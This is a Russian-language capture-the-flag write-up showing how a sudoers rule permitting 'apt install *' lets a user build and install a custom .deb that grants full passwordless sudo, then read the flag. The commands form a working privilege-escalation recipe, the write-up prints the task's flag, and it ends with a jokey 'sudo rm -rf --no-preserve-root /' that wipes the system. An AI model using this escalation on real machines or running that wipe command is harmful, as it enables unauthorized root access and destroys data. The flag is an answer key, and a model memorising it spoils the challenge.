# Всю руку откусят: Write-up

Ура, на нашей системе разрешили запускать `apt`! Правда, не любой, а только `apt install` с любыми дальнейшими аргументами:

```bash
user@fingergiving:/$ cat /etc/sudoers.d/10-apt
user ALL=(ALL) NOPASSWD: /usr/bin/apt install *
```

Никакие другие команды выполнять нельзя, но это и не нужно: мы можем указать в качестве аргумента имя файла пакета, который сами же и соберём. Пакет, например, может добавлять в sudoers.d разрешение нам делать всё что угодно.

Найдём [какую-нибудь инструкцию про создание пакетов](https://www.baeldung.com/linux/create-debian-package) и последуем ей.

Создадим директории:

```bash
user@fingergiving:/$ cd /tmp
user@fingergiving:/tmp$ mkdir pkg pkg/DEBIAN pkg/etc pkg/etc/sudoers.d
```

И файлы (завершаем ввод сочетанием клавиш Ctrl+D в начале новой строки):

```bash
user@fingergiving:/tmp$ cat > pkg/DEBIAN/control
Package: pkg
Version: 1.0-1
Section: utils
Priority: optional
Architecture: all
Maintainer: Some <nnn@nnn.nnn>
Description: This is a test application for packaging

user@fingergiving:/tmp$ cat > pkg/etc/sudoers.d/09-all
user ALL=(ALL) NOPASSWD: ALL
```

Соберём пакет. Опция `--root-owner-group` необходима, чтобы владельцем устанавливаемого пакетом файла был root — иначе sudo будет игнорировать наше новое правило.

```bash
user@fingergiving:/tmp$ dpkg-deb --root-owner-group --build pkg
dpkg-deb: building package 'pkg' in 'pkg.deb'.
```

И установим:

```bash
user@fingergiving:/tmp$ sudo apt install ./pkg.deb
...
Setting up pkg (1.0-1) ...
...
```

Теперь можно творить всё, что хочется!

```bash
user@fingergiving:/tmp$ sudo cat /flag.txt
ugra_you_are_not_going_to_stop_after_the_elbow_43wyr65uxtyl
user@fingergiving:/tmp$ sudo rm -rf --no-preserve-root /
```

Флаг: **ugra_you_are_not_going_to_stop_after_the_elbow_43wyr65uxtyl**
